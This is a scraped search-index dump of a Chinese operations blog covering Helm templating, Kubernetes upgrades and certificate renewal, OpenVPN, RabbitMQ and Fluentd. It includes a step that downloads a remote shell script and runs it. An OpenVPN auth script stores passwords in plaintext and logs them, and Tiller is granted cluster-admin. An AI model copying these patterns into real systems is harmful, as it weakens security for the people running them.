drink: \"coffee\" food: \"PIZZA\" mug: true toppings: |- drink: coffee food: pizza ","date":"2020-06-18 18:21","objectID":"/post/1806/:5:2","tags":["k8s","helm"],"title":"helm模板开发-流程控制、作用域、循环、变量(三)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"range使用变量来接收遍历出来的值和索引，例如： apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} {{- if eq .drink \"coffee\" }} mug: true {{- end }} toppings: |- {{- end }} {{- range $index, $topping := .Values.pizzaToppings }} - {{ $index | toString | quote }}: {{ $topping | title | quote }} {{- end }} 渲染后： apiVersion: v1 kind: ConfigMap metadata: name: sanguine-hydra-configmap data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" mug: true toppings: |- - \"0\": \"Mushrooms\" - \"1\": \"Cheese\" - \"2\": \"Peppers\" - \"3\": \"Onions\" ","date":"2020-06-18 18:21","objectID":"/post/1806/:5:3","tags":["k8s","helm"],"title":"helm模板开发-流程控制、作用域、循环、变量(三)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"##模板函数 1.将.Values对象中的字符串注入模板时，我们需要的是字符串。我们可以通过调用quote函数来做到这一点： apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" drink: {{ quote .Values.favorite.drink }} food: {{ quote .Values.favorite.food }} 模板函数遵循以下语法functionName arg1 arg2…。在上面的代码段中，quote .Values.favorite.drink调用quote函数并将其传递给单个参数。 2.查看渲染后的结果 # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: singed-puffin-configmap data: myvalue: \"Hello World\" drink: \"hello\" food: \"world\" 可以看到drink和food都被加上了引号 模板函数拥有60多种可用函数。其中一些是由Go模板语言本身定义的。其他大多数都是Sprig模板库的一部分。我们将通过示例逐步介绍其中的许多内容。 ##管道 ","date":"2020-06-18 17:29","objectID":"/post/1804/:0:0","tags":["k8s","helm"],"title":"helm模板开发-模板功能和管道(二)","uri":"/post/1804/"},{"categories":["kubernetes"],"content":"模板语言的强大功能之一是其管道概念。管道利用UNIX的概念，是将一系列模板命令链接在一起以紧凑表达一系列转换的工具。换句话说，管道是按顺序完成多项工作的有效方式。 ###upper函数： 我们添加了upper函数，将food的值转换成大写 apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" drink: {{ .Values.favorite.drink | quote }} food: {{ .Values.favorite.food | upper | quote }} 渲染后的效果： # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: exegetical-wildebeest-configmap data: myvalue: \"Hello World\" drink: \"hello\" food: \"WORLD\" ","date":"2020-06-18 17:29","objectID":"/post/1804/:0:1","tags":["k8s","helm"],"title":"helm模板开发-模板功能和管道(二)","uri":"/post/1804/"},{"categories":["kubernetes"],"content":"repeat函数: 下面的例子将我们获取到的值，使用repeat函数重复5次 apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" drink: {{ .Values.favorite.drink | repeat 5 | quote }} food: {{ .Values.favorite.food | upper | quote }} 渲染后的效果： # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: quelling-sparrow-configmap data: myvalue: \"Hello World\" drink: \"hellohellohellohellohello\" food: \"WORLD\" ","date":"2020-06-18 17:29","objectID":"/post/1804/:0:2","tags":["k8s","helm"],"title":"helm模板开发-模板功能和管道(二)","uri":"/post/1804/"},{"categories":["kubernetes"],"content":"default函数 default可以设置一个默认值 apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" drink: {{ .Values.favorite.drink | repeat 5 | quote }} food: {{ .Values.favorite.food | default \"my is default\" | upper | quote }} 手动将favorite.food的值设置为空： helm install --dry-run --debug --set=favorite.food=null . 渲染后的效果 # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: ungaged-grizzly-configmap data: myvalue: \"Hello World\" drink: \"hellohellohellohellohello\" food: \"MY IS DEFAULT\" 在实际chart中，所有静态默认值都应位于values.yaml中，并且不应使用default命令重复（否则它们将是多余的） ","date":"2020-06-18 17:29","objectID":"/post/1804/:0:3","tags":["k8s","helm"],"title":"helm模板开发-模板功能和管道(二)","uri":"/post/1804/"},{"categories":["kubernetes"],"content":"chart包目录结构： demo1/ ├── charts #子chart包目录 ├── Chart.yaml #chart包的描述信息元数据 ├── templates # 资源清单模板目录 │ ├── deployment.yaml #资源清单模板 │ ├── _helpers.tpl #存放可在整个chart中重复使用的变量 │ ├── ingress.yaml #资源清单模板 │ ├── NOTES.txt #说明文件，install后会打印在屏幕中 │ └── service.yaml #资源清单模板 └── values.yaml #chart包的默认配置信息 Chart.yaml apiVersion: api版本，始终是v1 (必须) name: chart名称(必须) version: chart版本号 (必须) kubeVersion: 兼容的kubernetes版本 (可选) description: 描述信息 (可选) keywords: - 关键字列表 (可选) home: 项目url (可选) sources: - 项目源码url列表 (可选) maintainers: # 维护人员的信息(可选) - name: 名字 email: 邮箱 url: 维护人员的url engine: gotpl # 模板引擎的名称 (可选, 默认是gotpl) icon: 要用作图标的SVG或PNG图像的URL (可选) appVersion: chart包含的应用程序版本(可选) deprecated: 这个chart是否被废弃 (可选, 布尔型) tillerVersion: 需要的tiller版本(可选) ","date":"2020-06-18 12:53","objectID":"/post/1803/:1:0","tags":["k8s","helm"],"title":"helm模板开发入门(一)","uri":"/post/1803/"},{"categories":["kubernetes"],"content":"第一个模板： ","date":"2020-06-18 12:53","objectID":"/post/1803/:2:0","tags":["k8s","helm"],"title":"helm模板开发入门(一)","uri":"/post/1803/"},{"categories":["kubernetes"],"content":"1.创建chart： helm create mychart rm -fr mychart/templates/* ","date":"2020-06-18 12:53","objectID":"/post/1803/:2:1","tags":["k8s","helm"],"title":"helm模板开发入门(一)","uri":"/post/1803/"},{"categories":["kubernetes"],"content":"2.创建资源清单模板： vim mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" ","date":"2020-06-18 12:53","objectID":"/post/1803/:2:2","tags":["k8s","helm"],"title":"helm模板开发入门(一)","uri":"/post/1803/"},{"categories":["kubernetes"],"content":"3.安装 安装 helm install . --name my-cm #查看渲染后的模板 helm get manifest my-cm 上面的{{ .Release.Name }}意思是获取Release对象的Name值 ","date":"2020-06-18 12:53","objectID":"/post/1803/:2:3","tags":["k8s","helm"],"title":"helm模板开发入门(一)","uri":"/post/1803/"},{"categories":["kubernetes"],"content":"helm模板提供的内置对象： Release： Release.Name: release的名称 Release.Time: release的发布时间 Release.Namespace: release的namespace Release.Service: 发布服务的名称，总是Tiller Release.Revision: release的版本修订号。它从1开始，随着release的升级而增加。 Release.IsUpgrade: 如果当前操作是升级或回滚，则为true Release.IsInstall: 如果当前操作是安装，则为true Values：从values.yaml文件和用户提供的文件传递到模板的值。默认情况下Values为空。 Chart：读取Chart.yaml文件的内容。例如{{.Chart.Name}}-{{.Chart.Version}}将打印出mychart-0.1.0。 Files：这提供对图表中所有非特殊文件的访问。虽然无法使用它来访问模板，但是可以使用它来访问图表中的其他文件。 Files.Get 是一个按名称获取文件的函数（.Files.Get config.ini） Files.GetBytes 是将文件内容作为字节数组而不是字符串获取的函数。这对于像图片这样的东西很有用。 Capabilities: 提供了关于 Kubernetes 集群支持的功能的信息 Capabilities.APIVersions：是一组版本信息。 Capabilities.APIVersions.Has $version：是否支持指定的api或resources版本 Capabilities.KubeVersion：提供查找Kubernetes版本的方法。它有以下值:Major、Minor、GitVersion、GitCommit、GitTreeState、BuildDate、GoVersion、Compiler和Platform。 Capabilities.TillerVersion：提供了一种查找tiller版本的方法。它有以下值:SemVer, GitCommit, GitTreeState。 Template: Contains information about the current template that is being executed Name:当前模板的文件路径(例如mychart/templates/mytemplate.yaml) BasePath: 当前chart模板目录路径(例如mychart/templates) 这些值可用于任何顶级模板。这并不一定意味着它们将在任何地方都可用。 ","date":"2020-06-18 12:53","objectID":"/post/1803/:3:0","tags":["k8s","helm"],"title":"helm模板开发入门(一)","uri":"/post/1803/"},{"categories":["kubernetes"],"content":"values 文件 传递到chart中的值。它的内容来自四个来源: chart包的values.yaml文件 如果是子chart，则values.yaml文件为父chart包的 通过-f参数指定一个文件(helm install -f myvals.yaml ./mychart) 通过–set指定 (helm install –set foo=bar ./mychart) 上面的列表按特定性顺序排列：values.yaml是默认值，可以被父图表的覆盖values.yaml，而后者可以由用户提供的值文件覆盖，而后者又可以由–set参数覆盖。 示例： 1.添加一个value echo 'name: soulchild' \u003e values.yaml 2.修改模板cat templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" namespace: {{ .Release.Namespace }} name: {{ .Values.name }} 3.升级chart helm upgrade my-cm . 4.查看渲染后的结果 helm get manifest my-cm --- # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: wishing-rottweiler-configmap data: myvalue: \"Hello World\" namespace: default name: soulchild ","date":"2020-06-18 12:53","objectID":"/post/1803/:4:0","tags":["k8s","helm"],"title":"helm模板开发入门(一)","uri":"/post/1803/"},{"categories":["kubernetes"],"content":"安装 下载客户端： wget https://get.helm.sh/helm-v2.10.0-linux-amd64.tar.gz 安装客户端: tar xf helm-v2.10.0-linux-amd64.tar.gz mv linux-amd64/helm /usr/local/sbin/ 安装tiller: helm init --tiller-image=registry.cn-shanghai.aliyuncs.com/soulchild/tiller:v2.10.0 通过helm version查看安装结果 配置rbac： apiVersion: v1 kind: ServiceAccount metadata: name: tiller namespace: kube-system --- apiVersion: rbac.authorization.k8s.io/v1beta1 kind: ClusterRoleBinding metadata: name: tiller roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-admin subjects: - name: tiller kind: ServiceAccount namespace: kube-system 指定pod的serviceaccount,也可以在初始化的时候加上–service-account参数 kubectl patch deployments. -n kube-system tiller-deploy -p '{\"spec\":{\"template\":{\"spec\":{\"serviceAccount\":\"tiller\"}}}}' ","date":"2020-06-17 16:49","objectID":"/post/1801/:1:0","tags":["k8s","helm"],"title":"helm2安装使用","uri":"/post/1801/"},{"categories":["kubernetes"],"content":"常用命令： #创建一个chart helm create demo1 #检查chart是否正常 helm lint demo1/ #将chart打包 helm package demo1/ #安装一个chart helm install demo1/ #查看release helm ls #查看历史release helm ls -a #删除release helm delete dusty-condor #删除历史release helm delete dusty-condor --purge #添加仓库 helm repo add aliyun https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts #查看仓库列表 helm repo list #更新仓库 helm repo update #查找chart包 helm search mysql #查看chart包详细信息 helm inspect aliyun/mariadb ","date":"2020-06-17 16:49","objectID":"/post/1801/:2:0","tags":["k8s","helm"],"title":"helm2安装使用","uri":"/post/1801/"},{"categories":["kubernetes"],"content":"master节点： 1.升级kubeadm yum install -y kubeadm-1.15.12-0 --disableexcludes=kubernetes 查看版本kubeadm version 2.检查可升级的版本 kubeadm upgrade plan 3.升级kubeadm配置 kubeadm upgrade apply v1.15.12 最后可以看到提示： [upgrade/successful] SUCCESS! Your cluster was upgraded to \"v1.15.12\". Enjoy! 4.升级kubelet和kubectl yum install -y kubelet-1.15.12-0 kubectl-1.15.12-0 --disableexcludes=kubernetes 5.升级CNI插件 容器网络接口（CNI）提供程序可能有其自己的升级说明。检查插件页面以找到您的CNI提供程序，并查看是否需要其他升级步骤。https://v1-15.docs.kubernetes.io/docs/concepts/cluster-administration/addons/ 如果CNI程序是DaemonSet运行，则在其他节点上不需要执行此步骤 6.升级其他master节点 kubeadm upgrade node yum install -y kubelet-1.15.12-0 kubectl-1.15.12-0 --disableexcludes=kubernetes 7.重启master节点kubelet systemctl restart kubelet ","date":"2020-06-16 16:40","objectID":"/post/1795/:1:0","tags":["k8s"],"title":"k8s 1.14.2 升级集群至1.15.12","uri":"/post/1795/"},{"categories":["kubernetes"],"content":"node节点： 升级kubeadm yum install -y kubeadm-1.15.12-0 --disableexcludes=kubernetes 驱逐节点 kubectl drain \u003cNodeName\u003e --ignore-daemonsets node节点执行升级kubeadm、kubelet： kubeadm upgrade node yum install -y kubelet-1.15.12-0 kubectl-1.15.x-0 --disableexcludes=kubernetes 重启kubelet： systemctl restart kubelet 恢复node节点调度： kubectl uncordon \u003cNodeName\u003e 查看升级后的节点版本信息： kubectl get nodes 官方文档： https://v1-15.docs.kubernetes.io/docs/tasks/administer-cluster/kubeadm/kubeadm-upgrade-1-15/ ","date":"2020-06-16 16:40","objectID":"/post/1795/:2:0","tags":["k8s"],"title":"k8s 1.14.2 升级集群至1.15.12","uri":"/post/1795/"},{"categories":["kubernetes"],"content":"参考：https://www.ancii.com/ahevxud6j/ 证书到期后会提示:Unable to connect to the server: x509: certificate has expired or is not yet valid 查看证书过期时间： # 方法1 kubeadm alpha certs check-expiration # 方法2 openssl x509 -noout -dates -in /etc/kubernetes/pki/apiserver.crt 各个证书的过期时间 /etc/kubernetes/pki/apiserver.crt #1年有效期 /etc/kubernetes/pki/front-proxy-ca.crt #10年有效期 /etc/kubernetes/pki/ca.crt #10年有效期 /etc/kubernetes/pki/apiserver-etcd-client.crt #1年有效期 /etc/kubernetes/pki/front-proxy-client.crt #1年有效期 /etc/kubernetes/pki/etcd/server.crt #1年有效期 /etc/kubernetes/pki/etcd/ca.crt #10年有效期 /etc/kubernetes/pki/etcd/peer.crt #1年有效期 /etc/kubernetes/pki/etcd/healthcheck-client.crt #1年有效期 /etc/kubernetes/pki/apiserver-kubelet-client.crt #1年有效期 1.备份配置文件和etcd cp -rp /etc/kubernetes /etc/kubernetes.bak cp -r /var/lib/etcd /var/lib/etcd.bak 2.生成集群配置文件 kubeadm config view \u003e ./cluster.yaml 3.证书续期 kubeadm alpha certs renew all --config=./cluster.yaml 4.重新生成配置文件 rm -f /etc/kubernetes/*.conf kubeadm init phase kubeconfig all --config=./cluster.yaml 5.重启kubelet、apiserver、controller-manager、scheduler、etcd docker ps |grep -E 'k8s_kube-apiserver|k8s_kube-controller-manager|k8s_kube-scheduler|k8s_etcd_etcd' | awk -F ' ' '{print $1}' |xargs docker restart 6.查看证书过期时间 for item in `find /etc/kubernetes/pki -maxdepth 2 -name \"*.crt\"`;do openssl x509 -in $item -text -noout| grep Not;echo ======================$item===============;done 7.复制新的认证文件 rm -fr ~/.kube/ cp /etc/kubernetes/admin.conf ~/.kube/config ","date":"2020-06-16 11:52","objectID":"/post/1558/:0:0","tags":["k8s"],"title":"k8s 1.14.2 使用kubeadm给证书续期","uri":"/post/1558/"},{"categories":["其他","基础内容"],"content":"脚本github地址：https://github.com/Nyr/openvpn-install 下载脚本： wget https://raw.githubusercontent.com/Nyr/openvpn-install/master/openvpn-install.sh 安装： sh openvpn-install.sh 没有特殊需求默认即可 56995-n3gc40qsaf.png soul用户的客户端配置文件路径：/root/soul.ovpn 将此文件导入到openvpn中，连接即可。 ","date":"2020-06-15 13:45","objectID":"/post/1782/:1:0","tags":[],"title":"一键安装openvpn并配置使用账号密码登陆","uri":"/post/1782/"},{"categories":["其他","基础内容"],"content":"配置使用账号密码验证 1.创建脚本:vim /etc/openvpn/checkpsw.sh #!/bin/sh ########################################################### # checkpsw.sh (C) 2004 Mathias Sundman \u003cmathias@openvpn.se\u003e # # This script will authenticate OpenVPN users against # a plain text file. The passfile should simply contain # one row per user with the username first followed by # one or more space(s) or tab(s) and then the password. PASSFILE=\"/etc/openvpn/psw-file\" LOG_FILE=\"/etc/openvpn/openvpn-password.log\" TIME_STAMP=`date \"+%Y-%m-%d %T\"` ########################################################### if [ ! -r \"${PASSFILE}\" ]; then echo \"${TIME_STAMP}: Could not open password file \\\"${PASSFILE}\\\" for reading.\" \u003e\u003e ${LOG_FILE} exit 1 fi CORRECT_PASSWORD=`awk '!/^;/\u0026\u0026!/^#/\u0026\u0026$1==\"'${username}'\"{print $2;exit}' ${PASSFILE}` if [ \"${CORRECT_PASSWORD}\" = \"\" ]; then echo \"${TIME_STAMP}: User does not exist: username=\\\"${username}\\\", password=\\\"${password}\\\".\" \u003e\u003e ${LOG_FILE} exit 1 fi if [ \"${password}\" = \"${CORRECT_PASSWORD}\" ]; then echo \"${TIME_STAMP}: Successful authentication: username=\\\"${username}\\\".\" \u003e\u003e ${LOG_FILE} exit 0 fi echo \"${TIME_STAMP}: Incorrect password: username=\\\"${username}\\\", password=\\\"${password}\\\".\" \u003e\u003e ${LOG_FILE} exit 1 2.添加权限 chmod 755 /etc/openvpn/checkpsw.sh 3.添加账号密码 echo 'username1 password1' \u003e\u003e /etc/openvpn/psw-file 4.修改server.conf # 追加以下内容 script-security 3 auth-user-pass-verify /etc/openvpn/checkpsw.sh via-env username-as-common-name verify-client-cert none 5.重启服务 systemctl restart openvpn-server@server 6.修改客户端文件soul.ovpn # 追加以下内容,\u003ccert\u003e和\u003ckey\u003e部分可以删掉 auth-user-pass 客户端填写用户名密码 20302-ekztnpyyhjj.png ","date":"2020-06-15 13:45","objectID":"/post/1782/:2:0","tags":[],"title":"一键安装openvpn并配置使用账号密码登陆","uri":"/post/1782/"},{"categories":["基础内容"],"content":"使用application-test.yml, java -Dspring.profiles.active=test -jar xxx.jar java -Dspring.config.location=./application.yml -jar xxx.jar ","date":"2020-06-05 17:13","objectID":"/post/2446/:0:0","tags":[],"title":"SpringBoot启动时加载本地配置文件","uri":"/post/2446/"},{"categories":["系统服务"],"content":"官方文档：https://www.rabbitmq.com/rabbitmqctl.8.html ","date":"2020-06-04 14:11","objectID":"/post/1774/:0:0","tags":["mq","rabbitmq"],"title":"rabbitmq常用命令行(二)-rabbitmqctl","uri":"/post/1774/"},{"categories":["系统服务"],"content":"命令格式 rabbitmqctl [-q] [-s] [-l] [-n node] [-t timeout] command [command_options] ","date":"2020-06-04 14:11","objectID":"/post/1774/:1:0","tags":["mq","rabbitmq"],"title":"rabbitmq常用命令行(二)-rabbitmqctl","uri":"/post/1774/"},{"categories":["系统服务"],"content":"参数选项： -n：指定node节点名称 -q：静默输出，减少信息输出 -s: 静默输出，减少信息输出并抑制表标头。 –no-table-headers：不输出表格数据的标题 –dry-run：尝试运行，不会真正的运行 -t：超时时间，默认无限 ","date":"2020-06-04 14:11","objectID":"/post/1774/:1:1","tags":["mq","rabbitmq"],"title":"rabbitmq常用命令行(二)-rabbitmqctl","uri":"/post/1774/"},{"categories":["系统服务"],"content":"常用命令选项： 用户管理： 添加用户：rabbitmqctl add_user \u003cusername\u003e \u003cpassword\u003e 修改密码：rabbitmqctl change_password \u003cusername\u003e \u003cnewpass\u003e 删除用户：rabbitmqctl delete_user \u003cusername\u003e 用户列表：rabbitmqctl list_users 设置用户角色：rabbitmqctl set_user_tags \u003cusername\u003e \u003ctag1,tag2\u003e 删除用户所有角色：rabbitmqctl set_user_tags \u003cusername\u003e 角色说明： management 用户可以访问management插件 policymaker 用户可以访问management插件，并管理他们有权访问的vhost的策略和参数。 monitoring 用户可以访问管理插件，查看所有连接和通道以及与节点相关的信息。 administrator 所有权限 访问控制 删除用户访问虚拟主机权限：rabbitmqctl clear_permissions -p \u003cvhost\u003e \u003cusername\u003e 查看虚拟主机对应用户的权限：rabbitmqctl list_permissions -p \u003cvhost\u003e 查看用户拥有哪些虚拟主机的权限：rabbitmqctl list_user_permissions \u003cusername\u003e 查看所有虚拟主机rabbitmqctl list_vhosts name tracing 给用户设置虚拟主机的权限：rabbitmqctl set_permissions -p \u003cvhost\u003e \u003cusername\u003e \".*\" \".*\" \".*\" 权限类型： Configure：创建与销毁资源 Write：写入资源 Read：读取资源 ","date":"2020-06-04 14:11","objectID":"/post/1774/:1:2","tags":["mq","rabbitmq"],"title":"rabbitmq常用命令行(二)-rabbitmqctl","uri":"/post/1774/"},{"categories":["系统服务"],"content":"服务启用管理 # 启动 rabbitmq-server -detached # 关闭 rabbitmqctl stop ","date":"2020-06-04 13:35","objectID":"/post/1772/:1:0","tags":["mq","rabbitmq"],"title":"rabbitmq常用命令行(一)-plugins","uri":"/post/1772/"},{"categories":["系统服务"],"content":"插件相关 ###1. list -v 显示所有插件的详情（详细） -m 仅仅只显示插件的名称 (简约) -E 仅仅只显示显式启用的插件 -e 仅仅只显示显式、隐式启用的插件 表示用于过滤插件名称表达式 # 显示所有的插件，每一行一个 rabbitmq-plugins list # 显示所有的插件，并且显示插件的版本号和描述信息 rabbitmq-plugins list -v # 显示所有名称含有 \"management\" 的插件 rabbitmq-plugins list -v management # 显示所有显示或者隐式启动的插件 rabbitmq-plugins list -e rabbit ###2. enable \u0026 disable \u0026 set –offline 仅仅修改启动的插件文件 –online 将与正在运行的代理连接失败视为致命错误 一个或多个插件名称 # 启用指定插件 rabbitmq-plugins enable # 禁用指定插件 rabbitmq-plugins disable # 禁用所有插件 rabbitmq-plugins set # 启用management插件和它所依赖的插件，禁用其他所有插件 rabbitmq-plugins set rabbitmq_management ","date":"2020-06-04 13:35","objectID":"/post/1772/:2:0","tags":["mq","rabbitmq"],"title":"rabbitmq常用命令行(一)-plugins","uri":"/post/1772/"},{"categories":["系统服务"],"content":"本文转自：https://www.cnblogs.com/zhming26/p/6140307.html 简单的rabbitmq配置可无需配置文件，只有需要定制复杂应用时，才需要用到配置文件 rabbitmq-env.conf配置 常用参数： RABBITMQ_NODE_IP_ADDRESS= //IP地址，空串bind所有地址，指定地址bind指定网络接口 RABBITMQ_NODE_PORT= //TCP端口号，默认是5672 RABBITMQ_NODENAME= //节点名称。默认是rabbit RABBITMQ_CONFIG_FILE= //配置文件路径 ，即rabbitmq.config文件路径 RABBITMQ_MNESIA_BASE= //mnesia所在路径 RABBITMQ_LOG_BASE= //日志所在路径 RABBITMQ_PLUGINS_DIR= //插件所在路径 rabbitmq.config配置 如果是用rpm包安装，可从默认docs目录复制配置文件样例： cp /usr/share/doc/rabbitmq-server-3.6.5/rabbitmq.config.example /etc/rabbitmq.config tcp_listerners #设置rabbimq的监听端口，默认为[5672]。 disk_free_limit #磁盘低水位线，若磁盘容量低于指定值则停止接收数据，默认值为{mem_relative, 1.0},即与内存相关联1：1，也可定制为多少byte. vm_memory_high_watermark #设置内存低水位线，若低于该水位线，则开启流控机制，默认值是0.4，即内存总量的40%。 hipe_compile #将部分rabbimq代码用High Performance Erlang compiler编译，可提升性能，该参数是实验性，若出现erlang vm segfaults，应关掉。 force_fine_statistics #该参数属于rabbimq_management，若为true则进行精细化的统计，但会影响性能。 frame_max #包大小，若包小则低延迟，若包则高吞吐，默认是131072=128K。 heartbeat #客户端与服务端心跳间隔，设置为0则关闭心跳，默认是600秒。 ","date":"2020-06-04 11:04","objectID":"/post/1770/:0:0","tags":["mq","rabbitmq"],"title":"rabbitmq3.6.5常用配置","uri":"/post/1770/"},{"categories":["系统服务"],"content":"安装erlang-19.3环境 erlang和rabbitmq版本对应关系 # 安装依赖 yum -y install make gcc gcc-c++ kernel-devel m4 ncurses-devel openssl-devel unixODBC-devel # 安装erlang19.3 wget http://erlang.org/download/otp_src_19.3.tar.gz tar xf otp_src_19.3.tar.gz cd otp_src_19.3/ ./configure --prefix=/usr/local/erlang --with-ssl -enable-threads -enable-smmp-support -enable-kernel-poll --enable-hipe --without-javac make \u0026\u0026 make install #配置环境变量 vim /etc/profile export ERL_HOME=/usr/local/erlang export PATH=$PATH:$ERL_HOME/bin 编译后可能会出现下面的信息，缺少wxWidgets库，这个库是用于图形化界面的，所以这里就忽略了 wx : wxWidgets not found, wx will NOT be usable 编译参数说明： –with-ssl：使用ssl -enable-threads：启用异步线程 -enable-smp-support：启用对称多处理 -enable-kernel-poll：启用kernel-poll在有很多连接时，可以极大的降低CPU的占用率 –enable-hipe：启用hipe可以提升计算速度 –without-javac：使用javac编译 ","date":"2020-06-04 08:56","objectID":"/post/1766/:1:0","tags":["mq","rabbitmq"],"title":"rabbitmq3.6.5二进制安装","uri":"/post/1766/"},{"categories":["系统服务"],"content":"安装rabbitmq-3.6.5 安装 wget https://www.rabbitmq.com/releases/rabbitmq-server/v3.6.5/rabbitmq-server-generic-unix-3.6.5.tar.xz tar xf rabbitmq-server-generic-unix-3.6.5.tar.xz mv rabbitmq_server-3.6.5 /usr/local/rabbitmq_server 创建配置文件 下面使用的是经典配置格式，3.7以上可以使用新格式k=v形式的 vim /usr/local/rabbitmq_server/etc/rabbitmq/rabbitmq.config [ {rabbit, [ {tcp_listeners, [5672]}, %% 默认情况下guest用户只能使用本地访问，这里把本地用户列表清空 {loopback_users,[]} ] } ]. 启动rabbitmq cd /usr/local/rabbitmq_server/sbin/ # 启动 ./rabbitmq-server -detached # 停止 ./rabbitmqctl stop 启用rabbitmq_management插件 # 查看插件列表 ./rabbitmq-plugins list # 启用插件 ./rabbitmq-plugins enable rabbitmq_management 端口说明： rabbitmq的端口是5672 rabbitmq_management插件的端口是15672 打开web页面 ip:15672，默认账号密码是guest ","date":"2020-06-04 08:56","objectID":"/post/1766/:2:0","tags":["mq","rabbitmq"],"title":"rabbitmq3.6.5二进制安装","uri":"/post/1766/"},{"categories":["ELK日志收集"],"content":"##参数 @type (必须) 指定插件 host (可选) es主机地址，默认localhost port (可选) es端口，默认9200 hosts (可选) 如果是集群，指定多个地址和端口，如果使用此选项，则忽略host和port选项。配置格式如下： hosts host1:port1,host2:port2,host3:port3 # or hosts https://customhost.com:443/path,https://username:password@host-failover.com:443 user, password (可选) es的登陆凭证 user fluent password mysecret scheme (可选) 指定协议，默认http path (可选) restapi用于发出写请求的路径(默认值: nil) index_name (可选) es索引名称，默认fluentd # 支持使用占位符 index_name fluentd.${tag} # 可以使用动态的时间占位符 ndex_name fluentd.${tag}.%Y%m%d # 要使用占位符需要在区块键中设置tag和time键。还需要为缓冲块的时间片指定timekey \u003cbuffer tag, time\u003e timekey 1h # chunks per hours (\"3600\" also available) \u003c/buffer\u003e logstash_format (可选) 设置为true后，Fluentd使用传统的索引名格式logstash-%Y.%m.%d(默认值: false)。 此选项取代index_name选项。 @log_leve (可选) 日志级别，支持fatal,error,warn,info,debug,trace. logstash_prefix (optional) 索引的前缀，默认logstash ","date":"2020-06-02 09:28","objectID":"/post/1762/:0:0","tags":["elasticsearch","elk","efk"],"title":"fluentd使用es插件作为输出","uri":"/post/1762/"},{"categories":["ELK日志收集"],"content":"配置文件 \u003csource\u003e @type http port 8888 \u003c/source\u003e \u003cmatch **\u003e @type elasticsearch host \"localhost\" port 9200 index_name \"fluentd.${tag}.%Y%m%d\" \u003cbuffer tag,time\u003e timekey 60s flush_mode interval flush_interval 10 \u003c/buffer\u003e \u003c/match\u003e 启动服务td-agent -c demo3.conf 发送日志测试：curl localhost:8888/test1 -d 'json={\"aaa\":\"bbb\"}' 等待10秒后，索引已经被创建了 71568-kvzlvbpuwh.png ","date":"2020-06-02 09:28","objectID":"/post/1762/:1:0","tags":["elasticsearch","elk","efk"],"title":"fluentd使用es插件作为输出","uri":"/post/1762/"},{"categories":["系统服务","ELK日志收集"],"content":"format部分可以位于或部分中。 ","date":"2020-06-01 13:47","objectID":"/post/1752/:0:0","tags":["elk"],"title":"fluentd格式化format（六）","uri":"/post/1752/"},{"categories":["系统服务","ELK日志收集"],"content":"插件类型 format部分需要@type参数来指定格式化程序插件的类型。 fluentd内置了一些有用的格式化程序插件。安装第三方插件时也可以使用 \u003cformat\u003e @type json \u003c/format\u003e 下面是一些内置的格式化插件： out_file json ltsv csv msgpack hash single_value ","date":"2020-06-01 13:47","objectID":"/post/1752/:1:0","tags":["elk"],"title":"fluentd格式化format（六）","uri":"/post/1752/"},{"categories":["系统服务","ELK日志收集"],"content":"参数： @type：指定插件类型 ","date":"2020-06-01 13:47","objectID":"/post/1752/:2:0","tags":["elk"],"title":"fluentd格式化format（六）","uri":"/post/1752/"},{"categories":["系统服务","ELK日志收集"],"content":"时间参数 time_type：时间类型 默认值：float 可选值：float, unixtime, string float: 纪元+纳秒(例如:1510544836.154709804) unixtime: 纪元(例如:1510544815) string: 使用由time_format、本地时间或时区指定的格式 time_format：时间格式 默认值：nil localtime：如果为真，使用本地时间。否则，使用 UTC 默认值：true utc：如果为真，使用UTC。否则，使用本地时间 默认值：false timezone：指定时区 默认值：nil 可用的时区格式： [+-]HH:MM(例如:+09:00) [+-]HHMM(例如:+0900) [+-]HH(例如:+09) Region/Zone(例如:Asia/Tokyo) Region/Zone/Zone(例如:America/Argentina/Buenos_Aires) ","date":"2020-06-01 13:47","objectID":"/post/1752/:3:0","tags":["elk"],"title":"fluentd格式化format（六）","uri":"/post/1752/"},{"categories":["系统服务","ELK日志收集"],"content":"json插件举例： json格式化插件将事件转换为json。默认情况下，json格式化程序结果不包含标签和时间字段。 可用参数： 通用参数 format参数 add_newline: 在结果中添加\\n 默认值：true 下面的配置是从/var/log/test.log文件中读取内容，并通过stdout插件打印到屏幕中 我们先来看一下不使用format的显示结果 \u003csource\u003e @type tail tag test.aa path /var/log/test.log pos_file /tmp/test.log.pos \u003cparse **\u003e @type none \u003c/parse\u003e \u003c/source\u003e \u003cmatch **\u003e @type stdout # \u003cformat\u003e # @type json # add_newline false # \u003c/format\u003e \u003c/match\u003e 模拟生成日志：echo 'test line 1' \u003e\u003e /var/log/test.log 19451-utsp60u6qw.png \u003csource\u003e @type tail tag test.aa path /var/log/test.log pos_file /tmp/test.log.pos \u003cparse **\u003e @type none \u003c/parse\u003e \u003c/source\u003e \u003cmatch test.**\u003e @type stdout \u003cformat\u003e @type json add_newline false \u003c/format\u003e \u003c/match\u003e 启动服务td-agent -c demo2.conf 模拟生成日志：echo 'test line 1' \u003e\u003e /var/log/test.log,可以看到日志只保留了json格式的部分 